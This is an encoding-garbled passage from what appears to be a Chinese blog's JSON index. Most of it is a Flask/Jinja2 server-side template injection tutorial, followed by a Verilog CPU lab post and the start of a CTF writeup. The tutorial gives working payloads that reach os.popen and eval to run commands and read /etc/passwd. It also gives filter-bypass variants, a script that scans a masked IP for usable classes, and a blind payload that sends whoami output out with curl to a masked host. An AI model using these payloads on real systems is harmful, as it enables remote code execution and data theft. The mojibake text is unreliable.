å»æ“ä½œã€‚\nå¸¸è§çš„ç»§æ‰¿å…³ç³»æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š\n1. base ï¼šå¯¹è±¡çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æ˜¯object2. mro  ï¼šè·å–å¯¹è±¡çš„åŸºç±»ï¼Œåªæ˜¯è¿™æ—¶ä¼šæ˜¾ç¤ºæ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè€Œobjectåœ¨æœ€åˆ—è¡¨çš„æœ€é¡¶å±‚ï¼Œé€šè¿‡mro[-1]å¯ä»¥è·å–åˆ°3. subclasses() : ç»§æ‰¿æ­¤å¯¹è±¡çš„å­ç±»ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨\n\nâ…¡. æ„é€ payload\n\næ”»å‡»æ–¹å¼ä¸ºï¼šå˜é‡-&gt;å¯¹è±¡-&gt;åŸºç±»-&gt;å­ç±»éå†-&gt;å…¨å±€å˜é‡\n1ã€ç›¸å…³å±æ€§å¯¹äºè¿”å›çš„æ˜¯ç±»å®ä¾‹ï¼š1. __class__            //è¿”å›å®ä¾‹çš„å¯¹è±¡ï¼Œå¯ä»¥ä½¿å®ä¾‹æŒ‡å‘classï¼Œä»è€Œä½¿ç”¨ä¸‹é¢çš„é­”æœ¯æ–¹æ³•å¦‚ï¼š&gt;&gt;&gt;&#x27;&#x27;.__class__  &lt;class &#x27;str&#x27;&gt;å¯¹äºè¿”å›çš„æ˜¯å®šä¹‰çš„classç±»ï¼š2. __base__              //è¿”å›ç±»çš„çˆ¶äº² python33. __mro__               //è¿”å›ç±»ç»§æ‰¿çš„å…ƒç»„ï¼Œå³å¯»æ‰¾çˆ¶ç±» python34. __subclasses__()      //è¿”å›ç±»ä¸­ä»ç„¶å¯ç”¨çš„å¼•ç”¨ï¼Œå¯ä»¥æ­¤è·å–æƒ³è¦çš„ç±»çš„å¯¹è±¡ python3å¦‚ï¼š&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138]  &lt;class &#x27;os._wrap_close&#x27;&gt;   Tipï¼šæ ¹æ®ç´¢å¼•å€¼æ¥è·å–æƒ³ç”¨çš„å¯åˆ©ç”¨ç±»,ä¸åŠ ç´¢å¼•ä¼šè¾“å‡ºå…¨éƒ¨å­˜æ´»çš„å¼•ç”¨5. __builtins__          //ä½œä¸ºé»˜è®¤åˆå§‹æ¨¡å—å‡ºç°ï¼Œå¯ç”¨äºæŸ¥çœ‹å½“å‰æ‰€æœ‰å¯¼å…¥çš„å†…å»ºå‡½æ•°6. __globals__           //å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ã€‚å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“ï¼Œä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ python37. __init__              //è¿”å›ç±»çš„åˆå§‹åŒ–æ–¹æ³•å¦‚ï¼š&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[38].__init__&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;Tip: &#x27;wrapper&#x27;æ˜¯æŒ‡è¿™äº›å‡½æ•°å¹¶æ²¡æœ‰è¢«é‡è½½ï¼Œè¿™æ—¶ä»–ä»¬å¹¶ä¸æ˜¯functionï¼Œä¸å…·æœ‰__globals__å±æ€§\n\n2ã€ä¸€ä¸ªç®€å•çš„payloadå¯»æ‰¾è¿‡ç¨‹â… . æ‰¾åˆ°__globals__å…¨å±€æ ¹æ®ä¸Šè¿°å±æ€§ï¼Œæ‰¾åˆ°é‡è½½è¿‡çš„ __init__ ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦ wrapper çš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå› æ­¤å¯»æ‰¾**ä¸å¸¦ warpper** çš„å³å¯ï¼‰ï¼Œå¹¶é€šè¿‡ __globals__ å…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°ï¼Œæˆ–è€…è·å– file ã€ os ç­‰æ¨¡å—ä»¥è¿›è¡Œä¸‹ä¸€æ­¥çš„åˆ©ç”¨ã€‚\n&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__&lt;function _wrap_close.__init__ at 0x0000025AA50BAEE0&gt;\n\nâ…¡. æŸ¥çœ‹å…¶å¼•ç”¨__builtins__&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;]            Tipï¼šè¿™é‡Œä¼šè¿”å› dict ç±»å‹ï¼Œå¯»æ‰¾ keys ä¸­å¯ç”¨å‡½æ•°ï¼Œä½¿ç”¨ keys ä¸­çš„ file ç­‰å‡½æ•°æ¥å®ç°è¯»å–æ–‡ä»¶çš„åŠŸèƒ½\n\n\nâ…¢. ä½¿ç”¨å¯åˆ©ç”¨å‡½æ•°å®ç°æ–‡ä»¶è¯»å–åŠŸèƒ½ç­‰&#39;&#39;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read() \n3ã€å¸¸ç”¨çš„ç›®æ ‡å‡½æ•°filesubprocess.Popenos.popenexeceval\n\n\nå‡ ä¸ªå«æœ‰evalå‡½æ•°çš„ç±»ï¼šwarnings.catch_warningsWarningMessagecodecs.IncrementalEncodercodecs.IncrementalDecodercodecs.StreamReaderWriteros._wrap_closereprlib.Reprweakref.finalizeâ€¦â€¦\n\n4ã€å‘½ä»¤æ‰§è¡ŒPythonå¸¸ç”¨çš„ä¸‰ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š\n\nos.system()è¯¥æ–¹æ³•çš„å‚æ•°å°±æ˜¯ string ç±»å‹çš„å‘½ä»¤ï¼Œåœ¨ linux ä¸Šè¿”å›å€¼ä¸ºæ‰§è¡Œå‘½ä»¤çš„ exit å€¼ï¼›è€Œwindowsä¸Šè¿”å›å€¼åˆ™æ˜¯è¿è¡Œå‘½ä»¤å shell çš„è¿”å›å€¼ï¼›æ³¨æ„ï¼šè¯¥å‡½æ•°è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœçš„è¿”å›å€¼ï¼Œå¹¶ä¸æ˜¯è¿”å›å‘½ä»¤çš„æ‰§è¡Œè¾“å‡ºï¼ˆæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼‰ï¼Œå› æ­¤éœ€è¦é…åˆ curl å¤–å¸¦æ•°æ®æŸ¥çœ‹å›æ˜¾          #è¿™é‡Œç”»ä¸ªé—®å· \n\n\nos.popen()è¿”å›çš„æ˜¯ file read çš„å¯¹è±¡ï¼Œå¦‚æœæƒ³è·å–æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºï¼Œåˆ™éœ€è¦è°ƒç”¨è¯¥å¯¹è±¡çš„ read() æ–¹æ³•\n\n\nç›´æ¥å¯»æ‰¾ os æ¨¡å—æ‰§è¡Œå‘½ä»¤å…ˆç¼–å†™è„šæœ¬éå†Pythonä¸­å«æœ‰osæ¨¡å—çš„ç±»çš„ç´¢å¼•å·ï¼Œç„¶åé€‰å–å…¶ä¸­ä¸€ä¸ªæ„é€ payloadæ‰§è¡Œå‘½ä»¤ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;os.py&#x27; in res.text:        print(i)\n\n\n\nç”¨ä¾‹:\n&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)Tip: éœ€è¦å¯¼å…¥osæ¨¡å—&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)Tip: éœ€è¦å¯¼å…¥osæ¨¡å—&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[79].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir&#x27;).read()\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿æ˜¯ä½¿ç”¨osæ¨¡å—æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¹Ÿæ˜¯è°ƒç”¨çš„osæ¨¡å—ä¸­çš„popenå‡½æ•°ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨popenå‡½æ•°ï¼Œå­˜åœ¨popenå‡½æ•°çš„ç±»ä¸€èˆ¬æ˜¯ os._wrap_closeï¼Œä½†ä¹Ÿä¸ç»å¯¹ã€‚ç”±äºç›®æ ‡Pythonç¯å¢ƒçš„ä¸åŒï¼Œæˆ‘ä»¬è¿˜éœ€è¦éå†ä¸€ä¸‹ã€‚\n\näº‹å®ä¸Šï¼Œåœ¨æœ¬åœ°pythonç¯å¢ƒä¸‹ï¼Œå¯ä»¥ç›´æ¥åœ¨os._wrap_closeæ‰¾åˆ°popenå‡½æ•°ï¼š&#39;&#39;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()\n\nã€å‚è€ƒèµ„æ–™ï¼šä»¥ Bypass ä¸ºä¸­å¿ƒè°­è°ˆ Flask-jinja2 SSTI çš„åˆ©ç”¨ã€‘\nä¸‰ã€æ¨¡æ¿æ³¨å…¥ç»•è¿‡1ã€è¯­æ³•å®˜æ–¹æ–‡æ¡£å¯¹äºæ¨¡æ¿çš„éƒ¨åˆ†è¯­æ³•ä»‹ç»å¦‚ä¸‹ï¼ˆä»ç„¶ä»¥jinja2ä¸ºä¾‹ï¼šTemplate Designer Documentationï¼‰\n\n1 åŸºæœ¬è¯­æ³•\n\n&#123;% ... %&#125; for Statements å¯ç”¨æ¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ç”¨ä»¥å¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥&#123;&#123; ... &#125;&#125; for Expressions to print to the template outputç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º&#123;# ... #&#125; for Comments not included in the template outputè¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š#  ... # for Line Statements## å¯ä»¥æœ‰å’Œ &#123;%%&#125; ç›¸åŒçš„æ•ˆæœ\n\n2 dot(.)çš„ç»•è¿‡\n\nYou can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ â€œsubscriptâ€ syntax ([]). --å®˜æ–¹åŸæ–‡å¯ä»¥ç”¨ . æˆ–è€… [] æ¥è®¿é—®å˜é‡çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´&#123;&#123;&quot;&quot;.__class__&#125;&#125;  ç­‰ä»·äº  &#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;\nå› æ­¤ï¼Œå½“.è¢«è¿‡æ»¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[]ä»¥ç»•è¿‡ã€‚\n\n3 å¦‚æœæƒ³è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶æœ¬è´¨å…¶å®æ˜¯è°ƒç”¨äº†é­”æœ¯æ–¹æ³•__getitem__\n\næ‰€ä»¥å¯¹äºå–å­—å…¸ä¸­é”®å€¼çš„æƒ…å†µä¸ä»…å¯ä»¥ç”¨[]ï¼Œä¹Ÿå¯ä»¥ç”¨__getitem__\n&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;\n\n4 è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œå…·ä½“æ˜¯è°ƒç”¨äº†é­”æœ¯æ–¹æ³•__getattribute__\n\n&quot;&quot;.__class__&quot;&quot;.__getattribute__(&quot;__class__&quot;)\n\n5 lipsumflaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š\n\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;#åœ¨CTFä¸­å¾ˆå¥½ç”¨\nã€å‚è€ƒèµ„æ–™ï¼šSSTIã€‘\n2ã€ç»•è¿‡â… . å­—ç¬¦ä¸²1ã€æ‹¼æ¥&quot;cla&quot;+&quot;ss&quot;\n2ã€åè½¬&quot;__ssalc__&quot;[::-1]\n3ã€ç¼–ç ç»•è¿‡ï¼ˆASCIIç ã€Unicodeç¼–ç ç­‰ï¼‰4ã€åˆ©ç”¨chrå‡½æ•°å› ä¸ºæˆ‘ä»¬æ²¡æ³•ç›´æ¥ä½¿ç”¨chrå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡__builtins__æ‰¾åˆ°ä»–\n&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;  //%2bä¸º + ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²==&gt;&#123;&#123;&quot;&quot;.__class__&#125;&#125;\n\n5ã€åœ¨jinja2é‡Œé¢å¯ä»¥åˆ©ç”¨~è¿›è¡Œæ‹¼æ¥\n&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;\n\n6ã€å¤§å°å†™è¿‡æ»¤è½¬æ¢\nâ…¡. è¿‡æ»¤å™¨\nåœ¨æ¨¡æ¿ä¸­, è¿‡æ»¤å™¨ç›¸å½“äºä¸€ä¸ªå‡½æ•°, æŠŠå½“å‰çš„å˜é‡ä¼ å…¥åˆ°è¿‡æ»¤å™¨ä¸­, ç„¶åè¿‡æ»¤å™¨æ ¹æ®è‡ªèº«åŠŸèƒ½, å†è¿”å›å¯¹åº”çš„å€¼, ä¹‹åå†æŠŠç»“æœæ¸²æŸ“åˆ°é¡µé¢ä¸­åŸºæœ¬è¯­æ³•: &#123;&#123; å˜é‡ | è¿‡æ»¤å™¨åç§° &#125;&#125; ä½¿ç”¨ç®¡é“ç¬¦å·|è¿›è¡Œç»„åˆï¼Œå¯ä»¥é“¾æ¥å¤šä¸ªè¿‡æ»¤å™¨ã€‚ä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚\n\nå¸¸ç”¨çš„è¿‡æ»¤å™¨ï¼š\n1. attr#ç”¨äºè·å–å˜é‡ï¼Œå¯ç”¨äº. [] éƒ½è¢«è¿‡æ»¤çš„æƒ…å†µ&quot;&quot;|attr(&quot;__class__&quot;) &lt;==&gt; &quot;&quot;.__class__2. format#æ ¼å¼åŒ–å­—ç¬¦ä¸²&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)  &lt;==&gt;  &quot;__class__&quot;3. join#å°†ä¸€ä¸ªåºåˆ—æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œjoin (&#x27;|&#x27;)å°†ä»¤æ¯ä¸€ä¸ªå…ƒç´ è¢«&#x27;|&#x27;éš”å¼€&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] æˆ–è€… &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]&lt;==&gt;&quot;&quot;[&quot;__class__&quot;]4. lower#è½¬æ¢æˆå°å†™5. replace#æ›¿æ¢å­—ç¬¦ä¸²&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) æ„é€ å‡ºå­—ç¬¦ä¸² &quot;__class__&quot;&quot;__ssalc__&quot;|reverse æ„é€ å‡º &quot;__class__&quot;6. string#å°†å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡æµè§ˆå™¨æ˜¾ç¤ºçš„ç¬¦å·æ„é€ å‡ºæˆ‘ä»¬å¯åˆ©ç”¨çš„å­—ç¬¦ä¸²ã€ç¬¦å·ç­‰().__class__   å‡ºæ¥çš„æ˜¯&lt;class &#x27;tuple&#x27;&gt;().__class__|string)[0] å‡ºæ¥çš„æ˜¯&lt;7. list#è½¬æ¢æˆåˆ—è¡¨ï¼Œå¯ä»¥ä¸ä¸Šé¢çš„stringé…åˆï¼Œå°±å¯ä»¥è°ƒç”¨åˆ—è¡¨é‡Œé¢çš„æ–¹æ³•å–å­—ç¬¦äº†(()|select|string|list).pop(0)\nã€èµ„æ–™æŸ¥é˜…ï¼šSSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰ã€‘\nâ…¢. å…³é”®å­—ç»•è¿‡\n.å’Œ[]\n\nå¯ç”¨è¿‡æ»¤å™¨attrç»•è¿‡ï¼Œè‹¥.å¯ç”¨ï¼Œè¿˜å¯ä»¥__getitem__ç»•è¿‡[]ã€‚\n\n\n&quot;&quot;å’Œ_ç»•è¿‡\n\nrequest.argsã€request.valuesã€request.cookies æ˜¯ flask ä¸­çš„å±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠpathå½“ä½œå˜é‡åï¼Œå°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤\n\n\n\n&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd=&gt;&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\n\n\n&#123;&#123;&#125;&#125;ç»•è¿‡\nç”¨&#123;%%&#125;çš„å·¦åŠè¾¹ç»•è¿‡\n\n\n\n&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami` ').read()=='p' %&#125;1&#123;% endif %&#125;\nå››ã€SSTIæ£€æµ‹1ã€Tplmap2ã€é™„è¡¨ä½¿ç”¨æ ‡å¿—æµ‹è¯•ã€‚å¦‚jinja2ï¼š&#123;&#123;7+8&#125;&#125;ï¼Œå¦‚æœè¾“å‡º15ï¼Œåˆ™æœ‰å¯èƒ½å­˜åœ¨SSTIæ¼æ´ã€‚&lt;å›¾æº: https://www.cnblogs.com/icez/archive/2018/04/07/ssti_check_payload.html&gt;\n","categories":["æ¸—é€ï¼šä»0åˆ°1"],"tags":["web","æ¸—é€","å¸¸è§æ¼æ´"]},{"title":"ç®€æ˜“CPUçš„Verilogå®ç°","url":"/2023/01/26/%E7%AE%80%E6%98%93CPU%E7%9A%84Verilog%E5%AE%9E%E7%8E%B0/","content":"æœ¬æ¬¡å®éªŒéœ€è¦å®ç°ä¸€ä¸ª CPU çš„è¿ç®—å™¨ã€‚ç®€æ˜“è¿ç®—å™¨ç”±ä¸‰ä¸ª 8 ä½å¯„å­˜å™¨ï¼ˆR0ã€R1ã€R2ï¼‰å’Œä¸€ä¸ªç®—æœ¯é€»è¾‘å•å…ƒ (ALU) æ„æˆï¼Œå…¶ä¸­ ALU åº”è¯¥è‡³å°‘æ”¯æŒåŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•ï¼Œä¸ã€æˆ–ã€æˆ–éã€ä¸éã€æ¯”è¾ƒçš„åŠŸèƒ½ï¼Œè¾“å…¥ç”±å¼€å…³æ§åˆ¶ã€‚\n\nå®éªŒä»»åŠ¡åŠè¯´æ˜å®éªŒä»»åŠ¡\næœ¬æ¬¡å®éªŒéœ€è¦å®ç°ä¸€ä¸ª CPU çš„è¿ç®—å™¨ã€‚ç®€æ˜“è¿ç®—å™¨ç”±ä¸‰ä¸ª 8 ä½å¯„å­˜å™¨ï¼ˆR0ã€R1ã€R2ï¼‰å’Œä¸€ä¸ªç®—æœ¯é€»è¾‘å•å…ƒ (ALU) æ„æˆï¼Œå…¶ä¸­ ALU åº”è¯¥è‡³å°‘æ”¯æŒåŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•ï¼Œä¸ã€æˆ–ã€æˆ–éã€ä¸éã€æ¯”è¾ƒçš„åŠŸèƒ½ã€‚\nè¾“å…¥ç”±å¼€å…³æ§åˆ¶ï¼›æ¯ä¸€æ­¥è¿ç®—åï¼Œç›¸åº”æ ‡å¿—ä½ï¼ˆæ ‡å¿—ä½è®¾ç½®åŒå®éªŒå››ï¼‰çš„æƒ…å†µé€šè¿‡ LED ç¯è¡¨ç¤ºï¼›è¿ç®—ç»“æœä»¥åè¿›åˆ¶é€šè¿‡æ•°ç ç®¡æ˜¾ç¤ºã€‚è¯»å–æ•°æ®çš„ç»“æœä»¥åè¿›åˆ¶é€šè¿‡æ•°ç ç®¡æ˜¾ç¤ºã€‚\næ—¶é’Ÿä¿¡å·ã€å¤ä½ä¿¡å·ç­‰æ§åˆ¶ä¿¡å·å…è®¸ç”¨å¼€å…³æ§åˆ¶ã€‚\n\n\næ³¨ï¼š1. æœ¬æ¬¡å®éªŒæ¶‰åŠçš„æ•°æ®çš†ä¸ºè¡¥ç ã€‚2. å®éªŒè¯´æ˜ç»™å‡ºçš„é»˜è®¤æŒ‡ä»¤é›†ç”±å®šé•¿æŒ‡ä»¤æ„æˆï¼Œå…¶ä¸­æŒ‡ä»¤çš„æ“ä½œç ä¸ºå˜é•¿æ“ä½œç ã€‚\n\nå®éªŒè¯´æ˜\nå®éªŒä½¿ç”¨å…«ä½äºŒè¿›åˆ¶ä¸²ï¼ˆb7b6b5b4b3b2b1b0ï¼‰è¡¨ç¤ºæŒ‡ä»¤ï¼Œä¸å¼€å‘æ¿ä¸Šçš„å…«ä¸ªå¼€å…³å¯¹åº”ã€‚\nå®éªŒä½¿ç”¨å››ä½äºŒè¿›åˆ¶è¡¥ç ä½œä¸ºè¾“å…¥ï¼Œä¸å¼€å‘æ¿ä¸Šçš„å››ä¸ªå¼€å…³å¯¹åº”ã€‚\nä¸‰ä¸ªå¯„å­˜å™¨ R0ï¼ŒR1ï¼ŒR2 åˆ†åˆ«å¯¹åº”äºŒè¿›åˆ¶åœ°å€ç  00,01,10.\n\nè¿ç®—æŒ‡ä»¤æ ¼å¼é«˜å››ä½ (b7b6b5b4) ä¸ºæ“ä½œç ï¼Œæ¬¡ä½ä¸¤ä½ï¼ˆb3b2ï¼‰ä¸ºåœ°å€ç ï¼ˆæŒ‡æ˜å­˜æ”¾ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„å¯„å­˜å™¨ï¼‰ï¼Œæœ€ä½ä¸¤ä½ (b1b0) ä¸ºåœ°å€ç ï¼ˆæŒ‡æ˜å­˜æ”¾ç¬¬äºŒä¸ªæ“ä½œæ•°çš„å¯„å­˜å™¨ï¼‰ã€‚\n\næ³¨ï¼šè¿ç®—ç»“æœå§‹ç»ˆé»˜è®¤å­˜æ”¾è‡³å¯„å­˜å™¨ R2 å› æ­¤ä¸åœ¨æŒ‡ä»¤ä¸­æ˜¾å¼æŒ‡å‡ºã€‚æœ‰ç¬¦å·ä¹˜æ³•çš„ç»“æœè‹¥è¶…è¿‡8 æ¯”ç‰¹åº”å½“è§£é‡Šä¸ºæº¢å‡ºã€‚\n\næ“ä½œç å¯¹åº”çš„è¿ç®—æ“ä½œç”±ä¸‹è¡¨è¯´æ˜ï¼Œå…¶ä¸­ A è¡¨ç¤ºç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼ŒB è¡¨ç¤ºç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚\n\n\n\nè¿ç®—æŒ‡ä»¤çš„æ“ä½œç ï¼ˆb7b6b5b4ï¼‰\nè¿ç®—æ“ä½œ\n\n\n\n0000\nA &amp; B\n\n\n0001\nA | B\n\n\n0010\nA+B\n\n\n0110\nA-B\n\n\n0111\næœ‰ç¬¦å·æ•°æ¯”è¾ƒ\n\n\n1100\nâˆ¼(A\n\n\n1101\nâˆ¼(A &amp; B)\n\n\n1110\nA * B\n\n\n\nä¾‹ï¼šæŒ‡ä»¤ 0010-0001 è¡¨ç¤ºè®¡ç®—å¯„å­˜å™¨ R0 çš„å€¼åŠ ä¸Šå¯„å­˜å™¨ R1 çš„å€¼ã€‚æŒ‡ä»¤ 0110-0110 è¡¨ç¤ºè®¡ç®—å¯„å­˜å™¨ R1 çš„å€¼å‡å»å¯„å­˜å™¨ R2 çš„å€¼ã€‚\n\nå­˜å‚¨æŒ‡ä»¤æ ¼å¼æœ€é«˜ä¸¤ä½ï¼ˆb7b6ï¼‰ä¸ºæ“ä½œç ç½® 10ï¼Œæ¬¡é«˜ä¸¤ä½ï¼ˆb5b4ï¼‰ä¸ºå†™å…¥å¯„å­˜å™¨çš„åœ°å€ç ï¼Œä½å››ä½ï¼ˆb3b2b1b0ï¼‰ä¸ºå¾…å†™å…¥æ•°æ®çš„äºŒè¿›åˆ¶è¡¥ç ã€‚\nè¯»å–æŒ‡ä»¤æ ¼å¼æœ€é«˜å…­ä½ï¼ˆb7b6b5b4b3b2ï¼‰ä¸ºæ“ä½œç ç½® 111100ï¼Œæœ€ä½ä¸¤ä½ï¼ˆb1b0ï¼‰ä¸ºåœ°å€ç ç½® 10ã€‚è¦æ±‚è¯¥æŒ‡ä»¤å¯è¯»å–å¯„å­˜å™¨ R2 çš„å€¼å¹¶ä»¥åè¿›åˆ¶é€šè¿‡æ•°ç ç®¡æ˜¾ç¤ºã€‚\n\næ³¨ï¼šä¸å¼ºåˆ¶è¦æ±‚æ”¯æŒè¯»å–å¹¶æ˜¾ç¤º R0ï¼ŒR1 å¯„å­˜å™¨çš„æ•°æ®ã€‚\n\nå®ç°è¿‡ç¨‹æ•°æ®é€šè·¯çš„è®¾è®¡åœ¨ç®€æ˜“CPUçš„åŸºç¡€ä¸Šï¼Œè¿›è¡Œäº†æ•°æ®é€šè·¯çš„è®¾è®¡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\n\n\nCPU å®ç°åœ¨ Controlã€ALUã€Reg ä¸‰ä¸ªæ¨¡å—ä¹‹ä¸Šã€‚å…¶ä¸­ Control æ¨¡å—ç”¨æ¥å¤„ç†æ¥è‡ªå¼€å…³çš„æ•°æ®ï¼Œè·å–ä½¿èƒ½ä¿¡å·ï¼›ALU æ¨¡å—ç”¨æ¥è¿›è¡Œç®—æœ¯é€»è¾‘è¿ç®—ï¼›Reg æ¨¡å—ç”¨æ¥å¤„ç†æ•°æ®çš„å­˜å‚¨ä¸è¯»å–ã€‚\nControl æ¨¡å—çš„è®¾è®¡ä¸å®ç°å¦‚ä¸Šæ–‡æ‰€è¨€ï¼ŒControl æ§åˆ¶å±‚éœ€è¦æ¥æ”¶æ¥è‡ªå¼€å…³çš„ opcode æŒ‡ä»¤ï¼Œç„¶åæ ¹æ®æŒ‡ä»¤åˆ¤æ–­æ˜¯å¦å­˜å…¥(EnWrite)ã€è¯»å– (EnRead_single)ã€è°ƒç”¨ ALU è¿ç®— (alu)ã€‚åŒæ—¶ï¼ŒControl æ¨¡å—è¿˜éœ€è¦æ¥æ”¶å¤ä½ä¿¡å· (ä¹Ÿå°±æ˜¯è¿™é‡Œçš„ Enter)ï¼Œå½“ Enter ä¸º 1 æ—¶ï¼Œå¯¹å·²ç»å®Œæˆè¾“å…¥çš„ opcde è¿›è¡Œå¤„ç†ï¼Œå¹¶è¿”å› OP æŒ‡ä»¤ï¼Œä¾›åç»­æ¨¡å—è°ƒç”¨ï¼›å½“ Enter ä¸º 0 æ—¶ï¼Œå°†æ‰€æœ‰ä½¿èƒ½ä¿¡å·ç½®é›¶ï¼Œå¹¶ä¸”ä¸è¾“å‡º OP æŒ‡ä»¤ã€‚å®ç°ä»£ç å¦‚ä¸‹ï¼š\n\n","categories":["è®¡ç®—æœºç»„æˆä¸è®¾è®¡"],"tags":["CPU","è®¡ç®—æœºç»„æˆä¸è®¾è®¡"]},{"title":"é›†è®­WriteUp-1","url":"/2023/01/13/%E9%9B%86%E8%AE%ADWriteUp-1/","content":"2023-01-10 WP\nT1 [hgame 2023]Classic Childhood 